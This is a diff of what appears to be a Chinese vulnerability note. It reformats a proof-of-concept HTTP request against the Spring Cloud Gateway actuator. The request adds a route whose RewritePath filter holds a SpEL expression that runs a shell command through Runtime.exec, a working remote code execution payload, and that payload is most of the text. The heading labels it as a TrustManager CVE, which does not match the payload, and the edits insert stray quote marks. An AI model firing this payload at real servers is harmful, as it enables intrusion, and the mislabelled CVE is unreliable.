@@ -38,42 +38,42 @@ CVE-2022-22946：HTTP2 不安全的 TrustManager :
 # ::p oc :
 
 
-POST /actuator/gateway/routes/new_route HTTP/1.1    
+‘’‘POST /actuator/gateway/routes/new_route HTTP/1.1    
 
-Host: 127.0.0.1:9000
+   Host: 127.0.0.1:9000
 
-Connection: close
+   Connection: close
 
-Content-Type: application/json
+   Content-Type: application/json
 
-{
+   {
 
- "predicates": [
+     "predicates": [
 
-    {
+        {
 
-     "name": "Path",
+         "name": "Path",
+ 
+         "args": {
 
-     "args": {
+           "_genkey_0": "/new_route/**"
+ 
+        }
 
-       "_genkey_0": "/new_route/**"
+        }
 
-     }
+     ],
 
-    }
+   "filters": [
 
-  ],
+     {
 
- "filters": [
+      "name": "RewritePath",
 
-    {
-
-     "name": "RewritePath",
-
-     "args": {
+      "args": {
 
        "_genkey_0": "#{T(java.lang.Runtime).getRuntime().exec(\"touch/tmp/x\")}",
-
+ 
        "_genkey_1": "/${path}"
 
      }
